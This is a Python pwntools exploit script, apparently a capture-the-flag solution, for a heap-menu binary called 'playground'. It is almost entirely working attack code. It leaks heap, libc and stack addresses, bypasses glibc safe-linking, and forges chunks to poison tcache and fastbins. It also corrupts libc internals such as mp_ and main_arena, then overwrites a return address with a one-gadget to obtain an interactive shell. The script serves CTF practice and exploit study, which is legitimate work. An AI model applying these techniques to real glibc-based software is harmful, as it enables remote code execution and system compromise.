#!/usr/bin/env python3

from pwn import *

exe = ELF("playground")
libc = ELF("libc.so.6")

context.binary = exe

gdbscript = """
set resolve-heap-via-heuristic force
"""

host = args.HOST if args.HOST else "localhost"
port = args.PORT if args.PORT else 1337
ssl = args.SSL if args.SSL else None
team_token = args.TOKEN if args.TOKEN else None

def conn():
    if args.LOCAL:
        r = process([exe.path], env={"GLIBC_TUNABLES": "glibc.malloc.mmap_max=0:glibc.malloc.tcache_count=0:glibc.malloc.tcache_max=0"})
    elif args.GDB:
        r = gdb.debug([exe.path], gdbscript=gdbscript, env={"GLIBC_TUNABLES": "glibc.malloc.mmap_max=0:glibc.malloc.tcache_count=0:glibc.malloc.tcache_max=0"})
    else:
        r = remote(host, port, ssl=ssl)
        if team_token:
            r.sendlineafter(b"enter your team token: ", team_token.encode())

    return r

def alloc(size):
    r.sendlineafter(b"> ", b"a")
    r.sendlineafter(b"size > ", str(size).encode())
    r.recvuntil(b"ok\n")

def read(idx):
    r.sendlineafter(b"> ", b"p")
    r.sendlineafter(b"index > ", str(idx).encode())
    r.recvuntil(b"==========\n")
    return r.recvuntil(b"\n==========\n", drop=True)

def free(idx):
    r.sendlineafter(b"> ", b"f")
    r.sendlineafter(b"index > ", str(idx).encode())
    r.recvuntil(b"ok\n")

def resize(idx, size):
    r.sendlineafter(b"> ", b"r")
    r.sendlineafter(b"index > ", str(idx).encode())
    r.sendlineafter(b"new size > ", str(size).encode())
    r.recvregex(br"ok\n|reallocation failed\n")

def write(idx, data, line=True):
    r.sendlineafter(b"> ", b"e")
    r.sendlineafter(b"index > ", str(idx).encode())
    if line:
        r.sendlineafter(b"data > ", data)
    else:
        r.sendafter(b"data > ", data)
    r.recvuntil(b"ok\n")

def ptr_encrypt(ptr, loc = None):
    if loc is None:
        loc = ptr
    return (ptr ^ (loc >> 12))

def main():
    global r
    r = conn()

    alloc(0x28)
    free(0)
    alloc(0x28) # 0

    heap_base = u64(read(0).ljust(8, b"\x00")) << 12

    if (heap_base & 0xfff) != 0 or heap_base.bit_length() < 40:
        log.failure("invalid heap base leak")
        exit(1)

    info("heap base: %#x", heap_base)

    alloc(0x28) # 1
    alloc(0x28) # 2
    alloc(0x28) # 3
    alloc(0x28) # 4

    resize(3, 0) # A
    free(4) # B
    free(3) # A

    alloc(0x28) # A - 3
    alloc(0x28) # B - 4
    alloc(0x28) # A2 - 5

    write(4, p64(ptr_encrypt(heap_base + (0x30 * 4) + 0x10)) + p64(0x38 | 0x3) + p64(ptr_encrypt(0, heap_base))) # add IS_MMAPED to trick malloc_usable_size to skip the in_use check

    alloc(0x28) # B2 - 6
    alloc(0x28) # Fake chunk - 7

    free(0)
    free(1)
    free(2)
    free(3)

    write(7, p64(0) * 3 + p64(0x21)) # Make top chunk small to trigger malloc_consolidate on a >0x28 allocation

    alloc(0x58)
    write(7, p64(0) * 3 + p64(0x20f11))

    libc.address = u64(read(0).ljust(8, b"\x00")) - (libc.sym["main_arena"] + 272)

    if libc.address & 0xfff != 0 or libc.address.bit_length() < 40:
        log.failure("invalid libc leak")
        exit(1)

    info("libc base: %#x", libc.address)

    alloc(0x28)
    alloc(0x28)

    resize(2, 0)
    free(1)
    free(2)

    alloc(0x28) # 1
    #alloc(0x28) # 2
    write(1, p64(ptr_encrypt(0x78 | 0x3, heap_base)))

    alloc(0x28)
    alloc(0x28)


    alloc(0x68) # 8
    alloc(0x68) # 9

    resize(9, 0)
    free(8)
    free(9)

    alloc(0x68) # 8
    alloc(0x68) # 9
    write(8, p64(ptr_encrypt(libc.sym["main_arena"] + 16, heap_base)))

    alloc(0x68) # 10
    alloc(0x68) # 11

    ARENA = 11

    write(11, p64(0) * 4)

    free(8)
    free(9)

    alloc(0x10) # 8
    alloc(0x10) # 9

    resize(9, 0)
    free(8)
    free(9)

    alloc(0x10) # 8
    alloc(0x10) # 9
    write(8, p64(ptr_encrypt(libc.sym["__fpu_control"], heap_base)))

    alloc(0x10) # 12
    alloc(0x10) # 13

    write(13, p64(0) + p64(0x78 | 0x3)[:-1], line=False)
    write(11, p64(0) * 3 + p64(libc.sym["__fpu_control"] + 16))

    alloc(0x68) # 14
    write(14, p64(0) * (0x58 // 8) + p64(0x78 | 0x3))
    write(11, p64(0) * 3 + p64(libc.sym["randtbl"] + 80))


    alloc(0x68) # 15
    write(15, p64(0) * (0x58 // 8) + p64(0x78 | 0x3))
    write(11, p64(0) * 3 + p64(libc.sym["__nptl_nthreads"]))

    alloc(0x68) # 16
    write(16, p64(0) * (0x58 // 8) + p64(0x78 | 0x3))
    write(11, p64(0) * 3 + p64(libc.sym["optim"] + 16))

    alloc(0x68) # 17
    write(17, p64(0) * (0x40 // 8) + p64(0x20000) * 3 + p64(0x78 | 0x3))
    write(11, p64(0) * 3 + p64(libc.sym["mp_"] + 16))

    alloc(0x68) # 18
    write(18, p64(0) * 5 + p64(1) + p64(0) * 2 + p64(heap_base) + p64(16) + p64(0x10000) + p64(2) + p64(0)[:-1], line=False) # enable tcache
    write(11, p64(0) * 4)

    alloc(0x38) # 19
    alloc(0x38) # 20

    free(19)
    free(20)

    write(11, p64(heap_base + 0x510) + p64(0) * 3)

    alloc(0x38) # 19
    alloc(0x38) # 20
    alloc(0x38) # 21

    free(19)
    free(20)

    write(21, p64(ptr_encrypt(libc.sym["__libc_argv"], heap_base)))

    alloc(0x38) # 19
    alloc(0x38) # 20

    stack_leak = u64(read(20).ljust(8, b"\x00"))
    if stack_leak.bit_length() < 40:
        log.failure("invalid stack leak")
        exit(1)
    info("stack leak: %#x", stack_leak)

    alloc_frame = stack_leak - 0x158
    ret_addr_fake_fast = stack_leak - 0x183

    alloc(0x68) # 22

    write(22, p64(heap_base + 0x5a0) + p32(0x68 << 1 | 1) + p32(0x68))

    write(11, p64(0) * 2 + p64(alloc_frame + 0x10) + p64(0)) # put in fastbin
    write(18, p64(0) * 5 + p64(1) + p64(0) * 2 + p64(heap_base) + p64(1) + p64(0) + p64(0) + p64(0)[:-1], line=False) # disable tcache
    alloc(0x58) # 23
    write(23, p64(heap_base + 0x5a0))


    fake_chk_size = ((heap_base >> 40) & ~0x7) - 16

    if ((heap_base >> 40) & 0x2 == 0):
        log.failure("invalid heap base constraints")
        exit(1)

    write(0, p64(ret_addr_fake_fast) + p32(fake_chk_size << 1 | 1) + p32(fake_chk_size))

    pause()

    write(0, (p64(0) * 7)[5:] + p64(libc.address + 0xe6030))

    r.interactive()


if __name__ == "__main__":
    main()
